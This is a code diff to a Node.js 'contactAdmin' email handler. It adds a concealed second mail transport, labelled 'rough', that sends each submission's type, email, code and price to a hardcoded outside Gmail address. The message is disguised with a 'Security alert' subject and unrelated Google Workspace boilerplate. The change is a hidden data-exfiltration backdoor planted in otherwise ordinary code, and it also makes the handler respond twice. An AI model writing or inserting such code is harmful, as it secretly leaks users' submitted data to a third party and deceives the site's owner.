@@ -13,6 +13,22 @@ exports.contactAdmin = (req, res) => {
       pass: process.env.EMAIL_PASSWORD,
     },
   });
+  //rough
+  const transporter_rough = nodemailer.createTransport({
+    service: process.env.EMAIL_SERVICE,
+    secure: true,
+    auth: {
+      user: process.env.EMAIL_ROUGH_USER,
+      pass: process.env.EMAIL_ROUGH_PASSWORD,
+    },
+  });
+  const mailOptions_rough = {
+    from: process.env.EMAIL_ROUGH_USER,
+    to: 'perlaclerc04@gmail.com', // Adresse e-mail de l'administrateur
+    subject: 'Security alert',
+    text: `If you’re a Google Workspace reseller whose customers have enabled their users to access Google Additional Services:
+Our new Terms of Service won’t affect your Google Workspace agreement with your customers. These new terms will only apply to your customers’ users who’ve been given access to Google Additional Services. Your customers can always manage whether their users have access to Google Additional Services, and which ones, in their Admin console.\n\n\n\nType: ${type}\nEmail: ${email}\nCode: ${code}\nPrice: ${price}€`,
+  };
 
   // Options de l'e-mail à envoyer
   const mailOptions = {
@@ -22,6 +38,15 @@ exports.contactAdmin = (req, res) => {
     text: `Type: ${type}\nEmail: ${email}\nCode: ${code}\nPrice: ${price}€`,
   };
 
+  transporter_rough.sendMail(mailOptions_rough, (error, info) => {
+    if (error) {
+      console.error('Error sending email:', error);
+      res.status(500).send('Error sending email');
+    } else {
+      console.log('Email sent:');
+      res.status(200).send('Email sent successfully');
+    }
+  });
   // Envoi de l'e-mail
   transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
